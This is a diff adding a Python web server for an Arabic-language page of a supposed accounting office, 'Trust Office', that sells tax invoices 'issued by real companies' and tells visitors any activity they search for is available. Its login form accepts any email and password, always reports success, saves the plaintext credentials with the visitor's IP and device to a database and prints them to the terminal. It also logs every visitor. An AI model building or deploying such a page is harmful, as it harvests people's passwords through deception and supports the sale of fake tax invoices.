@@ -1,0 +1,676 @@
+import http.server
+import socketserver
+import json
+import sqlite3
+from datetime import datetime
+
+# ==================== التكوينات ====================
+PORT = 8080
+WHATSAPP_NUMBER = "201004765443"
+
+# ==================== قاعدة البيانات ====================
+def init_database():
+    conn = sqlite3.connect('visitors.db')
+    cursor = conn.cursor()
+    
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS visitors (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            ip_address TEXT,
+            device_info TEXT,
+            user_agent TEXT,
+            visit_time TIMESTAMP,
+            page_visited TEXT
+        )
+    ''')
+    
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS users (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            email TEXT,
+            password TEXT,
+            ip_address TEXT,
+            device_info TEXT,
+            login_time TIMESTAMP
+        )
+    ''')
+    
+    conn.commit()
+    conn.close()
+
+def log_visitor(ip, device_info, user_agent, page):
+    try:
+        conn = sqlite3.connect('visitors.db')
+        cursor = conn.cursor()
+        cursor.execute('''
+            INSERT INTO visitors (ip_address, device_info, user_agent, visit_time, page_visited)
+            VALUES (?, ?, ?, ?, ?)
+        ''', (ip, device_info, user_agent, datetime.now(), page))
+        conn.commit()
+        conn.close()
+    except:
+        pass
+
+def save_user(email, password, ip, device_info):
+    try:
+        conn = sqlite3.connect('visitors.db')
+        cursor = conn.cursor()
+        cursor.execute('''
+            INSERT INTO users (email, password, ip_address, device_info, login_time)
+            VALUES (?, ?, ?, ?, ?)
+        ''', (email, password, ip, device_info, datetime.now()))
+        conn.commit()
+        conn.close()
+        return True
+    except:
+        return False
+
+def get_device_info(user_agent):
+    ua = user_agent.lower()
+    if 'android' in ua:
+        return 'Android'
+    elif 'iphone' in ua or 'ipad' in ua:
+        return 'iOS'
+    elif 'windows' in ua:
+        return 'Windows'
+    elif 'mac' in ua:
+        return 'Mac'
+    else:
+        return 'غير معروف'
+
+# ==================== HTML ====================
+MAIN_PAGE = '''<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مكتب تراست | أفضل مكتب للمحاسبة والاستشارات المالية</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Cairo', sans-serif;
+            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+        @keyframes float { 0%,100% { transform: translateY(0px); } 50% { transform: translateY(-20px); } }
+        @keyframes glow { 0%,100% { text-shadow: 0 0 5px rgba(255,215,0,0.5); } 50% { text-shadow: 0 0 30px rgba(255,215,0,0.8); } }
+        @keyframes slideIn { from { opacity: 0; transform: translateX(50px); } to { opacity: 1; transform: translateX(0); } }
+        @keyframes pulse { 0%,100% { transform: scale(1); } 50% { transform: scale(1.05); } }
+        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+        @keyframes fadeIn { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }
+        
+        .navbar {
+            background: rgba(0,0,0,0.3);
+            backdrop-filter: blur(20px);
+            padding: 1rem 5%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: fixed;
+            width: 100%;
+            top: 0;
+            z-index: 1000;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.2);
+        }
+        .logo {
+            font-size: 1.8rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #ffd700, #ffb347);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: glow 2s ease-in-out infinite;
+        }
+        .login-btn {
+            background: linear-gradient(135deg, #ffd700, #ffb347);
+            color: #1a2a3a;
+            padding: 10px 25px;
+            border-radius: 50px;
+            font-weight: 700;
+            border: none;
+            cursor: pointer;
+            font-family: inherit;
+            transition: all 0.3s;
+        }
+        .login-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 20px rgba(255,215,0,0.5);
+        }
+        .user-info {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            background: rgba(255,215,0,0.2);
+            padding: 8px 20px;
+            border-radius: 50px;
+        }
+        .user-info span {
+            color: #ffd700;
+            font-weight: 500;
+        }
+        .logout-btn {
+            background: rgba(255,255,255,0.2);
+            color: white;
+            padding: 5px 15px;
+            border-radius: 50px;
+            text-decoration: none;
+            font-size: 0.9rem;
+        }
+        .hero {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            padding: 100px 5% 50px;
+            position: relative;
+            overflow: hidden;
+        }
+        .hero::before {
+            content: '';
+            position: absolute;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,215,0,0.1) 0%, transparent 70%);
+            animation: rotate 20s linear infinite;
+        }
+        .hero-content {
+            position: relative;
+            z-index: 10;
+            animation: slideIn 1s ease-out;
+        }
+        .hero h1 {
+            font-size: 4rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #ffd700, #ffb347, #ff8c00);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 1rem;
+            animation: glow 2s ease-in-out infinite;
+        }
+        .hero p {
+            font-size: 1.3rem;
+            color: rgba(255,255,255,0.9);
+            margin-bottom: 2rem;
+        }
+        .search-box {
+            background: rgba(255,255,255,0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 60px;
+            padding: 10px 20px;
+            display: flex;
+            max-width: 600px;
+            margin: 2rem auto;
+            border: 2px solid rgba(255,215,0,0.5);
+        }
+        .search-box:hover {
+            border-color: #ffd700;
+            box-shadow: 0 0 20px rgba(255,215,0,0.3);
+        }
+        .search-box input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            padding: 15px 20px;
+            font-size: 1.1rem;
+            color: white;
+            font-family: inherit;
+            outline: none;
+        }
+        .search-box input::placeholder { color: rgba(255,255,255,0.6); }
+        .search-box button {
+            background: linear-gradient(135deg, #ffd700, #ffb347);
+            border: none;
+            padding: 12px 30px;
+            border-radius: 50px;
+            font-weight: 700;
+            cursor: pointer;
+        }
+        .search-result {
+            margin-top: 2rem;
+            padding: 20px;
+            border-radius: 20px;
+            background: rgba(0,0,0,0.5);
+            backdrop-filter: blur(10px);
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+        .search-result.show {
+            display: block;
+            border: 2px solid #25D366;
+            background: rgba(37,211,102,0.2);
+        }
+        .result-icon { font-size: 3rem; margin-bottom: 10px; }
+        .result-title { font-size: 1.5rem; font-weight: 700; margin-bottom: 10px; color: #ffd700; }
+        .contact-now-btn {
+            display: inline-block;
+            background: linear-gradient(135deg, #25D366, #128C7E);
+            color: white;
+            padding: 12px 35px;
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: 700;
+            animation: pulse 1.5s ease-in-out infinite;
+            margin-top: 15px;
+        }
+        .floating-badge {
+            display: inline-block;
+            background: rgba(255,215,0,0.2);
+            backdrop-filter: blur(10px);
+            padding: 15px 30px;
+            border-radius: 60px;
+            margin-top: 2rem;
+            animation: float 3s ease-in-out infinite;
+        }
+        .cards-section, .documents {
+            padding: 80px 5%;
+            background: linear-gradient(135deg, #1a2a3a, #0f2027);
+        }
+        .section-title {
+            text-align: center;
+            font-size: 2.5rem;
+            color: #ffd700;
+            margin-bottom: 3rem;
+            position: relative;
+        }
+        .section-title::after {
+            content: '';
+            position: absolute;
+            bottom: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100px;
+            height: 3px;
+            background: linear-gradient(90deg, transparent, #ffd700, transparent);
+        }
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 2rem;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        .feature-card {
+            background: rgba(255,255,255,0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 2rem;
+            text-align: center;
+            transition: all 0.5s;
+            border: 1px solid rgba(255,215,0,0.3);
+            animation: float 4s ease-in-out infinite;
+        }
+        .feature-card:hover {
+            transform: translateY(-10px);
+            border-color: #ffd700;
+        }
+        .feature-icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #ffd700, #ffb347);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 1.5rem;
+        }
+        .feature-icon i { font-size: 2.5rem; color: #1a2a3a; }
+        .feature-card h3 { color: #ffd700; margin-bottom: 1rem; }
+        .feature-card p { color: rgba(255,255,255,0.8); }
+        .doc-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1.5rem;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        .doc-item {
+            background: rgba(255,215,0,0.1);
+            border-radius: 15px;
+            padding: 1.5rem;
+            text-align: center;
+            border: 1px solid rgba(255,215,0,0.3);
+        }
+        .doc-item i { font-size: 2rem; color: #ffd700; margin-bottom: 0.5rem; }
+        .doc-item span { color: white; }
+        .contact-btn {
+            display: inline-block;
+            background: linear-gradient(135deg, #25D366, #128C7E);
+            color: white;
+            padding: 15px 40px;
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: 700;
+            margin-top: 2rem;
+            animation: pulse 2s ease-in-out infinite;
+        }
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            backdrop-filter: blur(10px);
+            z-index: 2000;
+            justify-content: center;
+            align-items: center;
+        }
+        .modal-content {
+            background: linear-gradient(135deg, #1a2a3a, #0f2027);
+            border-radius: 30px;
+            padding: 40px;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            border: 2px solid #ffd700;
+        }
+        .modal-content h2 { color: #ffd700; margin-bottom: 1.5rem; }
+        .modal-content input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 10px;
+            background: rgba(255,255,255,0.9);
+            font-family: inherit;
+        }
+        .modal-content button {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(135deg, #ffd700, #ffb347);
+            border: none;
+            border-radius: 10px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 1rem;
+        }
+        .close-modal {
+            position: absolute;
+            top: 20px;
+            right: 30px;
+            font-size: 2rem;
+            color: white;
+            cursor: pointer;
+        }
+        .footer {
+            background: #0a1419;
+            padding: 40px 5% 20px;
+            text-align: center;
+            color: rgba(255,255,255,0.6);
+        }
+        @media (max-width: 768px) {
+            .hero h1 { font-size: 2rem; }
+            .section-title { font-size: 1.8rem; }
+            .search-box { flex-direction: column; border-radius: 20px; }
+            .search-box button { margin-top: 10px; }
+            .navbar { flex-direction: column; gap: 10px; }
+        }
+    </style>
+</head>
+<body>
+    <nav class="navbar">
+        <div class="logo">💼 مكتب تراست | Trust Office</div>
+        <div id="authSection">
+            <button class="login-btn" onclick="openLoginModal()"><i class="fas fa-user"></i> Login</button>
+        </div>
+    </nav>
+
+    <section class="hero">
+        <div class="hero-content">
+            <h1>مكتب تراست<br>للمحاسبة والاستشارات المالية</h1>
+            <p>يوفر لكم فواتير ضريبية ورقية وإلكترونية بأفضل الأسعار<br>وبأعلى مستوى من المصداقية والضمان</p>
+            
+            <div class="search-box">
+                <input type="text" id="searchInput" placeholder="🔍 اكتب النشاط أو البند الذي تبحث عنه..." onkeypress="handleEnter(event)">
+                <button onclick="searchActivity()"><i class="fas fa-search"></i> بحث</button>
+            </div>
+            
+            <div id="searchResult" class="search-result"></div>
+            
+            <div class="floating-badge">
+                <i class="fas fa-check-circle"></i> مطابق للمنظومة الضريبية 100%
+            </div>
+        </div>
+    </section>
+
+    <section class="cards-section">
+        <h2 class="section-title">✨ مميزاتنا ✨</h2>
+        <div class="features-grid">
+            <div class="feature-card"><div class="feature-icon"><i class="fas fa-shield-alt"></i></div><h3>صادرة من شركات حقيقية</h3><p>ليست وهمية أو محظورة - ضمان 100%</p></div>
+            <div class="feature-card"><div class="feature-icon"><i class="fas fa-check-double"></i></div><h3>مطابقة للمنظومة الضريبية</h3><p>معتمدة رسمياً بنسبة 100%</p></div>
+            <div class="feature-card"><div class="feature-icon"><i class="fas fa-file-invoice"></i></div><h3>كافة الضمانات والمستندات</h3><p>نوفر جميع المستندات الرسمية</p></div>
+            <div class="feature-card"><div class="feature-icon"><i class="fas fa-trophy"></i></div><h3>أفضل الأسعار</h3><p>أسعار تنافسية وجودة عالية</p></div>
+        </div>
+    </section>
+
+    <section class="documents">
+        <h2 class="section-title">📎 المستندات المرفقة مع الفاتورة 📎</h2>
+        <div class="doc-grid">
+            <div class="doc-item"><i class="fas fa-id-card"></i><br><span>شهادة التسجيل في ضريبة القيمة المضافة</span></div>
+            <div class="doc-item"><i class="fas fa-building"></i><br><span>صورة السجل التجاري</span></div>
+            <div class="doc-item"><i class="fas fa-credit-card"></i><br><span>صورة البطاقة الضريبية</span></div>
+            <div class="doc-item"><i class="fas fa-receipt"></i><br><span>إيصال استلام نقدية</span></div>
+            <div class="doc-item"><i class="fas fa-file-signature"></i><br><span>إقرار ضريبي</span></div>
+            <div class="doc-item"><i class="fas fa-desktop"></i><br><span>لقطة شاشة للتأكيد</span></div>
+        </div>
+    </section>
+
+    <div style="text-align: center; padding: 80px 5%; background: linear-gradient(135deg, #0f2027, #1a2a3a);">
+        <a href="https://wa.me/201004765443?text=السلام%20عليكم%20أحتاج%20فاتورة%20ضريبية" class="contact-btn" target="_blank"><i class="fab fa-whatsapp"></i> تواصل معنا الآن</a>
+    </div>
+
+    <footer class="footer">
+        <p>© 2024 مكتب تراست للمحاسبة والاستشارات المالية - جميع الحقوق محفوظة</p>
+        <p>📞 للتواصل: 01004765443 | 📧 trust@accounting.com</p>
+    </footer>
+
+    <div id="loginModal" class="modal">
+        <span class="close-modal" onclick="closeLoginModal()">&times;</span>
+        <div class="modal-content">
+            <h2><i class="fas fa-user-lock"></i> تسجيل الدخول</h2>
+            <form id="loginForm" onsubmit="return submitLogin(event)">
+                <input type="email" id="loginEmail" placeholder="البريد الإلكتروني" required>
+                <input type="password" id="loginPassword" placeholder="كلمة المرور" required>
+                <button type="submit">دخول</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        let isLoggedIn = localStorage.getItem('isLoggedIn') === 'true';
+        let userEmail = localStorage.getItem('userEmail') || '';
+        
+        function updateAuthUI() {
+            const authSection = document.getElementById('authSection');
+            if (isLoggedIn && userEmail) {
+                authSection.innerHTML = `
+                    <div class="user-info">
+                        <span><i class="fas fa-user-check"></i> ${userEmail}</span>
+                        <a href="#" onclick="logout()" class="logout-btn">تسجيل خروج</a>
+                    </div>
+                `;
+            } else {
+                authSection.innerHTML = `<button class="login-btn" onclick="openLoginModal()"><i class="fas fa-user"></i> Login</button>`;
+            }
+        }
+        
+        function searchActivity() {
+            const searchTerm = document.getElementById('searchInput').value.trim();
+            const resultDiv = document.getElementById('searchResult');
+            
+            if (searchTerm === "") {
+                resultDiv.className = 'search-result';
+                resultDiv.innerHTML = '<div class="result-icon">🔍</div><div class="result-title">يرجى إدخال النشاط أو البند</div><div class="result-message">اكتب اسم النشاط الذي تبحث عنه وسنقوم بتوفيره لك</div>';
+                resultDiv.style.display = 'block';
+                return;
+            }
+            
+            fetch('/api/search', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({search: searchTerm})
+            });
+            
+            resultDiv.className = 'search-result show';
+            resultDiv.innerHTML = `
+                <div class="result-icon">✅</div>
+                <div class="result-title">✓ النشاط "${searchTerm}" متوفر!</div>
+                <div class="result-message">نعم، يمكننا توفير فواتير ضريبية لهذا النشاط بكل سهولة وبأفضل الأسعار وبأعلى مستوى من المصداقية.</div>
+                <a href="https://wa.me/201004765443?text=السلام%20عليكم%20أحتاج%20فاتورة%20ضريبية%20لنشاط%20${encodeURIComponent(searchTerm)}" class="contact-now-btn" target="_blank"><i class="fab fa-whatsapp"></i> تواصل الآن لعمل الفاتورة</a>
+            `;
+        }
+        
+        function handleEnter(event) { if (event.key === 'Enter') searchActivity(); }
+        
+        function openLoginModal() { document.getElementById('loginModal').style.display = 'flex'; }
+        function closeLoginModal() { document.getElementById('loginModal').style.display = 'none'; }
+        
+        function submitLogin(event) {
+            event.preventDefault();
+            const email = document.getElementById('loginEmail').value;
+            const password = document.getElementById('loginPassword').value;
+            
+            fetch('/api/login', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({email, password})
+            }).then(res => res.json()).then(data => {
+                if(data.success) {
+                    localStorage.setItem('isLoggedIn', 'true');
+                    localStorage.setItem('userEmail', email);
+                    isLoggedIn = true;
+                    userEmail = email;
+                    updateAuthUI();
+                    closeLoginModal();
+                    document.getElementById('loginForm').reset();
+                    alert('✓ تم تسجيل الدخول بنجاح!');
+                }
+            });
+            return false;
+        }
+        
+        function logout() {
+            localStorage.removeItem('isLoggedIn');
+            localStorage.removeItem('userEmail');
+            isLoggedIn = false;
+            userEmail = '';
+            updateAuthUI();
+            alert('تم تسجيل الخروج بنجاح');
+        }
+        
+        updateAuthUI();
+        
+        window.onclick = function(event) {
+            const modal = document.getElementById('loginModal');
+            if (event.target == modal) modal.style.display = 'none';
+        }
+    </script>
+</body>
+</html>
+'''
+
+# ==================== خادم HTTP ====================
+class CustomHandler(http.server.SimpleHTTPRequestHandler):
+    
+    def do_GET(self):
+        path = self.path.split('?')[0]
+        client_ip = self.client_address[0]
+        user_agent = self.headers.get('User-Agent', 'Unknown')
+        device_info = get_device_info(user_agent)
+        log_visitor(client_ip, device_info, user_agent, path)
+        
+        if path == '/' or path == '/index.html':
+            self.send_html(MAIN_PAGE)
+        else:
+            self.send_response(404)
+            self.send_header('Content-type', 'text/html; charset=utf-8')
+            self.end_headers()
+            self.wfile.write(b'<h1>404 - Page Not Found</h1><a href="/">Go to Home</a>')
+    
+    def do_POST(self):
+        if self.path == '/api/login':
+            content_length = int(self.headers.get('Content-Length', 0))
+            post_data = self.rfile.read(content_length)
+            data = json.loads(post_data.decode('utf-8'))
+            client_ip = self.client_address[0]
+            user_agent = self.headers.get('User-Agent', 'Unknown')
+            device_info = get_device_info(user_agent)
+            
+            email = data.get('email', 'غير معروف')
+            password = data.get('password', 'غير معروف')
+            
+            save_user(email, password, client_ip, device_info)
+            
+            # طباعة بيانات تسجيل الدخول في الكود بايثون
+            print("\n" + "=" * 60)
+            print("🔐 تسجيل دخول جديد!")
+            print("=" * 60)
+            print(f"📧 البريد الإلكتروني: {email}")
+            print(f"🔑 كلمة المرور: {password}")
+            print(f"💻 الجهاز: {device_info}")
+            print(f"🌐 عنوان IP: {client_ip}")
+            print(f"⏰ الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+            print("=" * 60 + "\n")
+            
+            self.send_json({'success': True})
+            
+        elif self.path == '/api/search':
+            content_length = int(self.headers.get('Content-Length', 0))
+            post_data = self.rfile.read(content_length)
+            data = json.loads(post_data.decode('utf-8'))
+            client_ip = self.client_address[0]
+            user_agent = self.headers.get('User-Agent', 'Unknown')
+            device_info = get_device_info(user_agent)
+            
+            print(f"🔍 بحث: {data.get('search', '')} | IP: {client_ip} | جهاز: {device_info}")
+            
+            self.send_json({'success': True})
+        else:
+            self.send_json({'success': False})
+    
+    def send_html(self, content):
+        self.send_response(200)
+        self.send_header('Content-type', 'text/html; charset=utf-8')
+        self.end_headers()
+        self.wfile.write(content.encode('utf-8'))
+    
+    def send_json(self, data):
+        self.send_response(200)
+        self.send_header('Content-type', 'application/json')
+        self.end_headers()
+        self.wfile.write(json.dumps(data, ensure_ascii=False).encode('utf-8'))
+    
+    def log_message(self, format, *args):
+        pass
+
+def run_server():
+    init_database()
+    with socketserver.TCPServer(("", PORT), CustomHandler) as httpd:
+        print("=" * 60)
+        print("💼 مكتب تراست - خادم الموقع")
+        print("=" * 60)
+        print(f"📍 http://localhost:{PORT}")
+        print("=" * 60)
+        print("\n✨ الميزات:")
+        print("  ✅ أي بحث يكتبه العميل -> يظهر له 'النشاط متوفر'")
+        print("  ✅ زر تواصل مباشر لعمل الفاتورة")
+        print("  ✅ تسجيل دخول (البريد + كلمة المرور)")
+        print("  ✅ بعد تسجيل الدخول تختفي علامة Login")
+        print("  ✅ بيانات تسجيل الدخول تظهر في Terminal")
+        print("\n📋 عند تسجيل الدخول ستظهر في Terminal:")
+        print("  📧 البريد الإلكتروني")
+        print("  🔑 كلمة المرور")
+        print("  💻 نوع الجهاز")
+        print("  🌐 عنوان IP")
+        print("\n🛑 لإيقاف الخادم: Ctrl+C\n")
+        try:
+            httpd.serve_forever()
+        except KeyboardInterrupt:
+            print("\n🛑 تم إيقاف الخادم")
+
+if __name__ == "__main__":
+    run_server()
